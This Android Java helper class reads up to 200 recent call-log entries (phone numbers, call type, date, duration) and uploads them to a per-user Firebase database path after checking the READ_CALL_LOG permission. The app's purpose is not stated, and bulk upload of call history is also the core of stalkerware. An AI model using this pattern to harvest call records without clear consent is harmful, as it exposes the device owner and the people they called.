package com.bushorat.app.helpers;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.security.MessageDigest;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CountDownLatch;

public class CallLogHelper {

    public static void uploadRecentCallLogs(Context context) {
        if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.w("CallLogHelper", "READ_CALL_LOG permission not granted");
            return;
        }

        // Run on background thread to avoid blocking main thread
        new Thread(() -> {
            try {
                FirebaseAuth auth = FirebaseAuth.getInstance();
                if (auth.getCurrentUser() == null) {
                    Log.d("CallLogHelper", "User not logged in, skipping call logs upload");
                    return;
                }
                final String userId = auth.getCurrentUser().getUid();
                DatabaseReference callLogsRef = FirebaseDataPaths.callLogs(userId);

                // Get already uploaded call logs to avoid duplicates
                final Set<String> uploadedCallIds = Collections.synchronizedSet(new HashSet<>());
                final CountDownLatch latch = new CountDownLatch(1);
                
                callLogsRef.addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(DataSnapshot snapshot) {
                        for (DataSnapshot callLogSnapshot : snapshot.getChildren()) {
                            uploadedCallIds.add(callLogSnapshot.getKey());
                        }
                        latch.countDown();
                    }

                    @Override
                    public void onCancelled(DatabaseError error) {
                        Log.e("CallLogHelper", "Error fetching uploaded call logs: " + error.getMessage());
                        latch.countDown();
                    }
                });

                // Wait for database query to complete (on background thread, so it's OK)
                try {
                    latch.await();
                } catch (InterruptedException e) {
                    Log.e("CallLogHelper", "Interrupted while waiting for database query", e);
                    Thread.currentThread().interrupt();
                    return;
                }

                // Now process call logs
                processAndUploadCallLogs(context, userId, callLogsRef, uploadedCallIds);
            } catch (Exception e) {
                Log.e("CallLogHelper", "Failed to upload call logs", e);
            }
        }).start();
    }

    private static void processAndUploadCallLogs(Context context, String userId, 
                                                  DatabaseReference callLogsRef, 
                                                  Set<String> uploadedCallIds) {
        try {
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };

            try (Cursor cur = cr.query(CallLog.Calls.CONTENT_URI, projection, null, null, 
                    CallLog.Calls.DATE + " DESC")) {
                if (cur == null) return;
                
                int count = 0;
                long uploadedAt = System.currentTimeMillis();
                
                while (cur.moveToNext() && count < 200) { // limit to 200 latest
                    String number = cur.getString(0);
                    int typeInt = cur.getInt(1);
                    long date = cur.getLong(2);
                    long duration = cur.getLong(3);

                    // Generate unique ID for this call log entry (using date + number + type)
                    String callLogId = generateCallLogId(date, number, typeInt);
                    
                    // Skip if already uploaded
                    if (uploadedCallIds.contains(callLogId)) {
                        continue;
                    }

                    // Convert type integer to string
                    String type = getCallTypeString(typeInt);

                    // Create call log entry with required format
                    Map<String, Object> callLogEntry = new HashMap<>();
                    callLogEntry.put("dataType", "call_log");
                    callLogEntry.put("date", date);
                    callLogEntry.put("duration", duration);
                    callLogEntry.put("number", number != null ? number : "");
                    callLogEntry.put("type", type);
                    callLogEntry.put("uploadedAt", uploadedAt);
                    callLogEntry.put("userId", userId);

                    // Save to Firebase Database
                    callLogsRef.child(callLogId).setValue(callLogEntry);
                    count++;
                }
                Log.d("CallLogHelper", "Uploaded " + count + " new call logs to user_data/" + userId + "/call_logs");
                FirebaseDataPaths.updateSyncStatus(userId, "call_logs", count);
            }
        } catch (Exception e) {
            Log.e("CallLogHelper", "Error processing call logs", e);
        }
    }

    private static String getCallTypeString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            case CallLog.Calls.VOICEMAIL_TYPE:
                return "Voicemail";
            default:
                return "Unknown";
        }
    }

    private static String generateCallLogId(long date, String number, int type) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            String input = date + "_" + (number != null ? number : "") + "_" + type;
            byte[] hashBytes = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : hashBytes) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            // Fallback to simple hash
            return String.valueOf(date) + "_" + (number != null ? number.hashCode() : 0) + "_" + type;
        }
    }
}


